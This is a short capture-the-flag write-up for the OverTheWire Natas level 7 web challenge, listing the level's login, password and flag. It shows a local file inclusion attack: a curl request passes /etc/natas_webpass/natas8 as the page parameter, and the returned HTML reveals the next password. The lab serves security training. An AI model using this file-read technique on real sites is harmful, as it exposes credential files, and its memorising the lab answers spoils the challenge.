# Natas7

*	user: `natas7`
*	pass: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
*	url: `http://natas7.natas.labs.overthewire.org`
*	flag: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Procedure

1.	Page provides `Home` and `About` that link to

		http://natas7.natas.labs.overthewire.org/index.php?page=home

	and

		http://natas7.natas.labs.overthewire.org/index.php?page=about

	By taking a look in the source code there is the hint

		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

2.	Let's try to pass `/etc/natas_webpass/natas8` path as `page` value

		$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
		<html>
		<head>[...]</head>
		<body>
		<h1>natas7</h1>
		<div id="content">

		<a href="index.php?page=home">Home</a>
		<a href="index.php?page=about">About</a>
		<br>
		<br>
		DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
		</div>
		</body>
		</html>
